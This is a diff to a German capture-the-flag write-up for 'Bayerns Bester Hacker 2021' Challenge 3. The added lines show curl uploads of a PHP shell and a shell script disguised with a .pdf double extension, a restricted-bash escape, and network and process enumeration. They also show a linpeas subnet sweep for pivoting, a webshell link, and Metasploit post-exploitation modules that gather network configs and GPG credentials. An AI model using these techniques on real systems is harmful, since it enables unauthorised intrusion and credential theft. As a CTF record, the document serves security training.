@@ -88,6 +88,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ![Bayerns Bester Hacker 2021 Challenge 3 - File Share 3](Screenshots/BBH2021C3_File-Share-3.png)
 ![Bayerns Bester Hacker 2021 Challenge 3 - File Share 4](Screenshots/BBH2021C3_File-Share-4.png)
 
+
+https://github.com/mayth/go-simple-upload-server
+curl -Ffile=@shell.php.pdf https://fileshare.rae-schmitt.ddnss.de/upload
+
+curl -F "file=@payload.sh.pdf" -F "to=" -F "id=fmgmt@tutanota.com" https://fileshare.rae-schmitt.ddnss.de/upload
+  Your files have been uploaded successfully. <br />
+  It's been saved as: <code>oktzuobbpk.zip</code><br />
+  The Password is: <code>YtnTHeJdirEdHn</code> <br /><br />
+  Pleas send the Password to <code></code> via a secure
+curl -v -X POST -F "email=fmgmt@tutanota.com" -F "password=pmbBEeHpdCEUbr" http://192.168.2.137:8080/files/auswdtpxyp.zip
+
+
 #### SSH-Host
 
 Der obige Scan legt einen SSH-Zugang offen, den ich wieder mit dem SSH-Key und User aus den vorherigen Challenges teste. Der Hinweis im vorherigen Login-Banner, dass alles ist wie vorher, bestätigt die Annahme:
@@ -101,14 +113,106 @@ Warning: Permanently added 'fileshare.rae-schmitt.ddnss.de,46.251.251.66' (ECDSA
 kayilvggxt@ubuntu_srv:~$
 ```
 
-**Hinweis:** Die bisher eingeloggten User und zufälligen Usernames deuten auf weitere Teilnehmer der Challenge hin und werden mit den Hosts nicht in Betracht gezogen.
+**Hinweis:** Die bisher eingeloggten User und zufälligen Usernames (Backup: [/etc/passwd](fileshare.rae-schmitt.ddnss.de/passwd) deuten auf weitere Teilnehmer der Challenge hin und werden mit den Hosts nicht in Betracht gezogen.
 ![Bayerns Bester Hacker 2021 Challenge 3 - Challenge Teilnehmer](Screenshots/BBH2021C3_Challenge-Teilnehmer.png)
 
+Die Standard-Login limitiert die Arbeitsumgebung in der Bash-Shell. Ein zweiter Start ```bash``` ermöglicht das *Ausbrechen* aus der Einschränkung vorerst:
 ![Bayerns Bester Hacker 2021 Challenge 3 - Bash Restricted](Screenshots/BBH2021C3_Bash-Restricted.png)
 ```
 kayilvggxt@ubuntu_srv:~$ cd 
 bash: cd: restricted
 ```
+
+##### Netzwerk-Konfiguration
+
+Mit ```ifconfig -a``` kann die aktuelle Netzwerk-Konfiguration angezeigt werden.
+```
+br-a03359a2d54e: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+        inet6 fe80::42:a7ff:fea2:d725  prefixlen 64  scopeid 0x20<link>
+        ether 02:42:a7:a2:d7:25  txqueuelen 0  (Ethernet)
+        RX packets 2797823  bytes 1292708646 (1.2 GB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2776376  bytes 1437636691 (1.4 GB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        inet6 fe80::42:95ff:fea1:ad1  prefixlen 64  scopeid 0x20<link>
+        ether 02:42:95:a1:0a:d1  txqueuelen 0  (Ethernet)
+        RX packets 2393  bytes 176176 (176.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 4020  bytes 32880985 (32.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ens18: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.2.136  netmask 255.255.255.0  broadcast 192.168.2.255
+        inet6 fe80::2088:5fff:fef2:770  prefixlen 64  scopeid 0x20<link>
+        ether 22:88:5f:f2:07:70  txqueuelen 1000  (Ethernet)
+        RX packets 38946116  bytes 16937099402 (16.9 GB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 45877498  bytes 15968547045 (15.9 GB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+
+##### Prozesse
+
+Die laufenden System-Prozesse werden ueber Docker-Container ausgefuehrt, was einen direkten Dateizugriff nicht ermoeglicht.
+```
+root      6986  0.0  0.0 112556   248 ?        Sl   Aug16   0:10 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 72dd70590fbb27209aab1047b6641fe361f56de79ef15ea3ae95346b10f5fe8e -address /run/containerd/containerd.sock
+root      6998  0.0  0.4 776692  8608 ?        Ssl  Aug16   5:39 /usr/bin/containerd
+root      7017  0.0  0.0   2316   836 ?        Ss   Aug16   0:00 /bin/bash /app/start.sh
+root      7258  0.0  0.1   3412  2860 ?        S    Aug16   0:03 /bin/bash /app/letsencrypt_service
+root      7259  0.0  0.2 711712  5284 ?        Sl   Aug16   6:50 docker-gen -watch -notify /app/signal_le_service -wait 5s:20s /app/letsencrypt_service_data.tmpl /app/letsencrypt_service_data
+root      7505  0.0  1.0 875708 22028 ?        Ssl  Aug16   4:05 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/contain
+erd.sock
+root     12968  0.0  0.0 478588  1232 ?        Sl   Aug16   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.18.0.3 -container-port 443
+root     12975  0.0  0.0 478588   856 ?        Sl   Aug16   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 443 -container-ip 172.18.0.3 -container-port 443
+root     12989  0.0  0.0 478588  1208 ?        Sl   Aug16   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.18.0.3 -container-port 80
+root     12994  0.0  0.0 478588   808 ?        Sl   Aug16   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 80 -container-ip 172.18.0.3 -container-port 80
+root     13008  0.0  0.0 113964   244 ?        Sl   Aug16   1:28 /usr/bin/containerd-shim-runc-v2 -namespace moby -id db6bc25482458a7f0179f6d1ced08ee0758f3b58f3b307867026c19975838a2d -address /run/containerd/containerd.sock
+root     13039  0.0  0.2 706556  4260 ?        Ssl  Aug16   0:51 forego start -r
+root     13112  0.0  0.1 711712  3704 ?        Ssl  Aug16   6:38 docker-gen -watch -notify nginx -s reload /app/nginx.tmpl /etc/nginx/conf.d/default.conf
+root     13113  0.0  0.0  62992  2016 ?        Ss   Aug16   0:00 nginx: master process nginx
+root     13564  0.0  0.0 112556   304 ?        Sl   Aug16   0:12 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 8ade13213858a9614ac64d0434301699b940dcfce4218c7d2f68d3e0131d0fd8 -address /run/containerd/containerd.sock
+root     13585  0.0  0.7 844680 15032 ?        Ssl  Aug16   4:01 ./go-simple-upload-server ./files
+```
+
+
+##### Pivot
+
+Schnelle Pr&uuml;fung des lokalen Netzwerks mit [linpeas.sh](https://linpeas.sh/): ```sh l.sh -a -d 192.168.2.1/24```
+```
+[+] Netmask /24 detected, starting...
+64 bytes from 192.168.2.2: icmp_seq=1 ttl=128 time=0.431 ms
+64 bytes from 192.168.2.1: icmp_seq=1 ttl=64 time=0.274 ms
+64 bytes from 192.168.2.136: icmp_seq=1 ttl=64 time=0.037 ms
+64 bytes from 192.168.2.134: icmp_seq=1 ttl=128 time=0.396 ms
+64 bytes from 192.168.2.137: icmp_seq=1 ttl=64 time=0.263 ms
+
+[+] Netmask /24 detected, starting...
+64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.038 ms
+Port 443:        Open
+
+[+] Netmask /24 detected, starting...
+64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.032 ms
+// keine offenen Ports
+
+64 bytes from 172.18.0.3: icmp_seq=1 ttl=64 time=0.031 ms
+('Please wait, scanning remote host', '172.18.0.3')
+------------------------------------------------------------
+Port 80:         Open
+Port 443:        Open
+
+64 bytes from 172.18.0.4: icmp_seq=1 ttl=64 time=0.038 ms
+('Please wait, scanning remote host', '172.18.0.4')
+------------------------------------------------------------
+Port 8080:       Open
+```
+
+Das durchschleusen der Anfragen und ein Upgrade der Session in Metasploit gestaltet sich schwierig:
+![Bayerns Bester Hacker 2021 Challenge 3 - Restricted Shell Pivot](Screenshots/BBH2021C3_Shell-Upgrade.png)
 
 
 # Fazit
@@ -116,3 +220,22 @@ bash: cd: restricted
 
 # Parkplatz
 
+tcpdump
+cftp3
+fakeroot-tcp
+
+Webshell:
+https://www.whitewinterwolf.com/posts/2017/12/02/wwwolfs-php-webshell-users-guide/
+
+
+
+msf6 post(linux/gather/enum_network) > exploit
+[+] Info:
+[+]     Ubuntu 18.04.5 LTS
+[+]     Linux ubuntu_srv 4.15.0-153-generic #160-Ubuntu SMP Thu Jul 29 06:54:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+[+] DNS config stored in /home/pw/.msf4/loot/20210822133453_default_46.251.251.66_linux.enum.netwo_584029.txt
+[+] SSHD config stored in /home/pw/.msf4/loot/20210822133453_default_46.251.251.66_linux.enum.netwo_581855.txt
+[+] Host file stored in /home/pw/.msf4/loot/20210822133453_default_46.251.251.66_linux.enum.netwo_977897.txt
+[+] If-Up/If-Down stored in /home/pw/.msf4/loot/20210822133453_default_46.251.251.66_linux.enum.netwo_077262.txt
+
+post(multi/gather/gpg_creds)
